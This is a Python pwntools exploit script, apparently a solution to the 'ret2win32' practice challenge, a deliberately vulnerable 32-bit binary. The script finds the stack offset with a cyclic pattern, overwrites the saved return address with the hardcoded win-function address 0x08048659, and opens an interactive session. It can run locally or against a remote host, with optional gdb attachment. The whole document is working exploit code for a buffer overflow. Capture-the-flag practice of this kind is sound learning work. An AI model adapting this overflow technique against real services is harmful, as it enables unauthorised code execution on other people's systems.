#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./ret2win32')
context.terminal = ['tmux', 'splitw', '-h']

host = args.HOST or ''
port = int(args.PORT or 8080)

def local(argv=[], *a, **kw):
    return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.REMOTE:
        return remote(argv, *a, **kw)
    else:
        return local(argv, *a, **kw)


#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

# SYSTEM_OFFSET = libc.sym.system
# libc = ELF("./libc-2.23.so")

io = start()

if args.GEF:
    gdb.attach(io, gdb_args=['-q', '-ex', 'init-gef'], gdbscript='''
    ''')
    # pie breakpoint put_pie+118

if args.PWNDBG:
    gdb.attach(io, gdb_args=['-q', '-ex', 'init-pwndbg'], gdbscript='''
    ''')
    # piebase 0x7f0

RET2WIN_ADDR = 0x08048659

io.recvuntil('>')
# io.sendline(cyclic(1024))
OFFSET = cyclic_find(0x6161616c)
# payload = "A" * OFFSET + p32(RET2WIN_ADDR)
payload = fit({OFFSET:p32(RET2WIN_ADDR)})
io.sendline(payload)

io.interactive()

